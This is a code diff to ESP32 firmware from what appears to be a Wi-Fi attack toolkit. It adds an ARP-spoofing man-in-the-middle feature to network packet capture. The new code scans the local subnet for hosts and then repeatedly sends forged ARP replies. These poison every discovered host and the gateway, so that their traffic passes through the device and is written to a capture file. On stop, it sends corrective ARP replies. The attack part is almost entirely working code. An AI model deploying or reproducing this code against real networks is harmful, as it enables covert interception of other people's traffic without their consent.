@@ -344,6 +344,22 @@ static char pcap_capture_filepath[64];
 static netif_input_fn pcap_original_input = NULL;
 static netif_linkoutput_fn pcap_original_linkoutput = NULL;
 
+// PCAP ARP spoofing state (net mode MITM)
+#define PCAP_ARP_MAX_HOSTS 64
+
+typedef struct {
+    uint8_t mac[6];
+    uint32_t ip;
+} pcap_arp_host_t;
+
+static TaskHandle_t pcap_arp_task_handle = NULL;
+static volatile bool pcap_arp_active = false;
+static pcap_arp_host_t pcap_arp_hosts[PCAP_ARP_MAX_HOSTS];
+static int pcap_arp_host_count = 0;
+static uint8_t pcap_arp_gateway_mac[6];
+static uint32_t pcap_arp_gateway_ip = 0;
+static uint8_t pcap_arp_own_mac[6];
+
 // Deauth/Evil Twin attack task
 static TaskHandle_t deauth_attack_task_handle = NULL;
 static volatile bool deauth_attack_active = false;
@@ -1425,6 +1441,7 @@ static void pcap_enqueue_frame(const uint8_t *data, uint16_t len);
 static void pcap_writer_task(void *param);
 static err_t pcap_netif_input_hook(struct pbuf *p, struct netif *inp);
 static err_t pcap_netif_linkoutput_hook(struct netif *netif, struct pbuf *p);
+static void pcap_arp_spoof_task(void *param);
 
 static bool wigle_split_key_pair(const char *input,
                                  char *api_name,
@@ -7315,6 +7332,19 @@ static int cmd_stop(int argc, char **argv) {
         if (pcap_capture_mode == PCAP_MODE_RADIO) {
             esp_wifi_set_promiscuous(false);
         } else if (pcap_capture_mode == PCAP_MODE_NET) {
+            if (pcap_arp_active) {
+                pcap_arp_active = false;
+                for (int i = 0; i < 60 && pcap_arp_task_handle != NULL; i++) {
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                }
+                if (pcap_arp_task_handle != NULL) {
+                    vTaskDelete(pcap_arp_task_handle);
+                    pcap_arp_task_handle = NULL;
+                    MY_LOG_INFO(TAG, "ARP spoof task force-deleted");
+                }
+                pcap_arp_host_count = 0;
+            }
+
             esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
             if (sta) {
                 struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta);
@@ -9532,12 +9562,105 @@ static int cmd_start_pcap(int argc, char **argv) {
             return 1;
         }
 
+        // --- ARP spoof MITM setup ---
+        esp_wifi_get_mac(WIFI_IF_STA, pcap_arp_own_mac);
+
+        esp_netif_ip_info_t ip_info;
+        esp_netif_get_ip_info(sta_netif, &ip_info);
+        pcap_arp_gateway_ip = ip_info.gw.addr;
+
+        bool gw_found = false;
+        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+            ip4_addr_t *ip_ret;
+            struct netif *nif_ret;
+            struct eth_addr *eth_ret;
+            if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                if (ip_ret->addr == pcap_arp_gateway_ip) {
+                    memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
+                    gw_found = true;
+                    break;
+                }
+            }
+        }
+        if (!gw_found) {
+            MY_LOG_INFO(TAG, "PCAP net: Gateway not in ARP table, sending ARP request...");
+            ip4_addr_t gw_ip = { .addr = pcap_arp_gateway_ip };
+            etharp_request(lwip_nif, &gw_ip);
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *nif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == pcap_arp_gateway_ip) {
+                        memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
+                        gw_found = true;
+                        break;
+                    }
+                }
+            }
+        }
+        if (!gw_found) {
+            MY_LOG_INFO(TAG, "PCAP net: Could not find gateway MAC. Continuing without ARP spoof.");
+        } else {
+            MY_LOG_INFO(TAG, "PCAP net: Gateway %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X",
+                        ip4_addr1_val(ip_info.gw), ip4_addr2_val(ip_info.gw),
+                        ip4_addr3_val(ip_info.gw), ip4_addr4_val(ip_info.gw),
+                        pcap_arp_gateway_mac[0], pcap_arp_gateway_mac[1], pcap_arp_gateway_mac[2],
+                        pcap_arp_gateway_mac[3], pcap_arp_gateway_mac[4], pcap_arp_gateway_mac[5]);
+
+            oled_display_update_full("> PCAP Net", "  ARP scanning...", "  Discovering hosts", "");
+            MY_LOG_INFO(TAG, "PCAP net: Scanning subnet for hosts...");
+
+            uint32_t ip_h = ntohl(ip_info.ip.addr);
+            uint32_t mask_h = ntohl(ip_info.netmask.addr);
+            uint32_t net_h = ip_h & mask_h;
+            uint32_t bcast_h = net_h | ~mask_h;
+            int req_sent = 0;
+            for (uint32_t t = net_h + 1; t < bcast_h && req_sent < 254; t++) {
+                ip4_addr_t target_ip;
+                target_ip.addr = htonl(t);
+                etharp_request(lwip_nif, &target_ip);
+                req_sent++;
+                if (req_sent % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));
+            }
+            MY_LOG_INFO(TAG, "PCAP net: Sent %d ARP requests, waiting for responses...", req_sent);
+            vTaskDelay(pdMS_TO_TICKS(3000));
+
+            pcap_arp_host_count = 0;
+            uint32_t own_ip = ip_info.ip.addr;
+            for (int i = 0; i < ARP_TABLE_SIZE && pcap_arp_host_count < PCAP_ARP_MAX_HOSTS; i++) {
+                ip4_addr_t *ip_ret;
+                struct netif *nif_ret;
+                struct eth_addr *eth_ret;
+                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
+                    if (ip_ret->addr == own_ip || ip_ret->addr == pcap_arp_gateway_ip) continue;
+                    memcpy(pcap_arp_hosts[pcap_arp_host_count].mac, eth_ret->addr, 6);
+                    pcap_arp_hosts[pcap_arp_host_count].ip = ip_ret->addr;
+                    pcap_arp_host_count++;
+                }
+            }
+
+            MY_LOG_INFO(TAG, "PCAP net: Found %d hosts to spoof", pcap_arp_host_count);
+
+            if (pcap_arp_host_count > 0) {
+                pcap_arp_active = true;
+                xTaskCreate(pcap_arp_spoof_task, "pcap_arp", 4096, NULL, 5, &pcap_arp_task_handle);
+                MY_LOG_INFO(TAG, "PCAP net: ARP spoof MITM started (IP forwarding enabled)");
+            }
+        }
+        // --- End ARP spoof setup ---
+
         pcap_original_input = lwip_nif->input;
         pcap_original_linkoutput = lwip_nif->linkoutput;
         lwip_nif->input = pcap_netif_input_hook;
         lwip_nif->linkoutput = pcap_netif_linkoutput_hook;
 
-        oled_display_update_full("> PCAP Net", "  Ethernet RX/TX", "  Capturing...", pcap_capture_filepath + 18);
+        {
+            char oled_l3[32];
+            snprintf(oled_l3, sizeof(oled_l3), "  MITM %d hosts", pcap_arp_host_count);
+            oled_display_update_full("> PCAP Net", "  Ethernet RX/TX", oled_l3, pcap_capture_filepath + 18);
+        }
         MY_LOG_INFO(TAG, "PCAP net capture started -> %s", pcap_capture_filepath);
     }
 
@@ -15515,6 +15638,84 @@ static void pcap_writer_task(void *param) {
                 (unsigned long)pcap_capture_drop_count);
 
     pcap_writer_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void pcap_arp_spoof_task(void *param) {
+    (void)param;
+
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        MY_LOG_INFO(TAG, "ARP spoof: STA netif not found");
+        pcap_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(sta_netif);
+    if (!lwip_nif || !lwip_nif->linkoutput) {
+        MY_LOG_INFO(TAG, "ARP spoof: lwIP netif or linkoutput not available");
+        pcap_arp_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Poisoning %d hosts + gateway", pcap_arp_host_count);
+    uint32_t round = 0;
+
+    while (pcap_arp_active) {
+        for (int i = 0; i < pcap_arp_host_count && pcap_arp_active; i++) {
+            send_arp_reply(lwip_nif,
+                           pcap_arp_hosts[i].mac,   // Eth dst: victim
+                           pcap_arp_own_mac,         // Eth src: our MAC
+                           pcap_arp_own_mac,         // ARP sender MAC: our MAC
+                           pcap_arp_gateway_ip,      // ARP sender IP: gateway (spoofed)
+                           pcap_arp_hosts[i].mac,    // ARP target MAC: victim
+                           pcap_arp_hosts[i].ip);    // ARP target IP: victim
+
+            send_arp_reply(lwip_nif,
+                           pcap_arp_gateway_mac,     // Eth dst: gateway
+                           pcap_arp_own_mac,          // Eth src: our MAC
+                           pcap_arp_own_mac,          // ARP sender MAC: our MAC
+                           pcap_arp_hosts[i].ip,      // ARP sender IP: victim (spoofed)
+                           pcap_arp_gateway_mac,      // ARP target MAC: gateway
+                           pcap_arp_gateway_ip);      // ARP target IP: gateway
+
+            vTaskDelay(pdMS_TO_TICKS(10));
+        }
+
+        round++;
+        if (round % 5 == 0) {
+            MY_LOG_INFO(TAG, "ARP spoof: round %lu, %d hosts", (unsigned long)round, pcap_arp_host_count);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(2000));
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Sending corrective ARP to restore network...");
+    for (int pass = 0; pass < 3; pass++) {
+        for (int i = 0; i < pcap_arp_host_count; i++) {
+            send_arp_reply(lwip_nif,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_ip,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].ip);
+
+            send_arp_reply(lwip_nif,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].mac,
+                           pcap_arp_hosts[i].ip,
+                           pcap_arp_gateway_mac,
+                           pcap_arp_gateway_ip);
+        }
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    MY_LOG_INFO(TAG, "ARP spoof: Network restored, task ending");
+    pcap_arp_task_handle = NULL;
     vTaskDelete(NULL);
 }
 
